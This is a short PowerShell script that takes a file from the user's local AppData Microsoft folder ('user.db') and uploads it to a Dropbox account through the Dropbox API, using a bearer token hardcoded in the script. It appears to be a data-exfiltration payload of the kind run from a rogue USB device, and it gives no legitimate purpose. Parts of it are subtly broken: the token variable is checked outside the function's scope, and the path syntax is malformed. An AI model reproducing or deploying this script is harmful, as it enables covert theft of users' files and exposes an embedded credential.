function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 

$db = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"

$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

$FileName = "$env:%LOCALAPPDATA%\Microsoft\user.db"
if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
